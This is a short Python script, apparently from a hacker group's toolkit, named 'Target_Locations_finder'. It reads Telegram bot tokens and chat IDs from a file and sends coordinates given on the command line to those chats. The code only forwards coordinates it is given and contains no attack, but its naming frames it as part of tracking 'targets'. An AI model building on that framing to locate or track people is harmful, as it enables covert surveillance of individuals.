#/usr/bin/env python3
# Target_Locations_finder V 1.0.1
# coded by: hack4lx
# 👊 ʍ4ղíƒҽՏԵ0 ϲվҍҽɾ ՏҽϲմɾíԵվ Եҽɑʍ™💪
# Thank You :  @rainboy1 | @KindKhers4lx | @Mohsening | @Vampire4lx | @erfan4lx | @HatBLACK4LX

import telebot, sys

try:
    
    f = open("bot-data.txt","r").read().splitlines()
    for d in f:
        df = d.split("$")
        token = df[0]
        chat_id = df[1]
        loc = sys.argv[1].split(":")
        bot = telebot.TeleBot(token)
        bot.send_location(chat_id, loc[0], loc[1])

except Exception as e:
    print(e)
